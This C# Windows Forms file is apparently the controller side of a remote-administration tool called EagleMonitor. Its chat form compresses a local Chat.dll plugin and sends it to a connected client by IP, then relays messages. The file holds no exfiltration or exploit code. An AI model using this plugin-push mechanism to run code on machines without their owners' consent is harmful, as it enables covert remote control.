using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class RemoteChatForm : FormPattern
    {
        internal ClientHandler clientHandler { get; set; }
        public bool hasAlreadyConnected { get; set; }
        private string baseIp { get; set; }
        public RemoteChatForm(string baseIp)
        {
            this.baseIp = baseIp;
            this.hasAlreadyConnected = false;
            InitializeComponent();
        }

        private void ChatForm_Load(object sender, EventArgs e)
        {
            startGuna2Button.Enabled = false;
            RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON);
            chatPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Chat.dll"), 1);
            chatPacket.baseIp = this.baseIp;
            ClientHandler.ClientHandlersList[baseIp].SendPacket(chatPacket);
        }

        private void startGuna2Button_Click(object sender, EventArgs e)
        {
            if (!hasAlreadyConnected)
            {
                startGuna2Button.Enabled = false;
                stopGuna2Button.Enabled = true;
                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON);
                chatPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Chat.dll"), 1);
                chatPacket.baseIp = this.baseIp;
                ClientHandler.ClientHandlersList[baseIp].SendPacket(chatPacket);
            }
        }

        private void stopGuna2Button_Click(object sender, EventArgs e)
        {
            if (hasAlreadyConnected)
            {
                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF);
                chatPacket.baseIp = baseIp;
                this.clientHandler.SendPacket(chatPacket);
                hasAlreadyConnected = false;
                startGuna2Button.Enabled = true;
                stopGuna2Button.Enabled = false;
            }
        }

        private void sendMsgGuna2Button_Click(object sender, EventArgs e)
        {
            if (hasAlreadyConnected) 
            {
                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON);
                chatPacket.msg = "Admin : " + messageGuna2TextBox.Text + "\n";
                chatPacket.baseIp = baseIp;
                this.messageRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
                this.messageRichTextBox.AppendText(chatPacket.msg);
                clientHandler.SendPacket(chatPacket);
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            if (hasAlreadyConnected)
            {
                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF);
                chatPacket.baseIp = baseIp;
                this.clientHandler.SendPacket(chatPacket);
            }
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label3_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
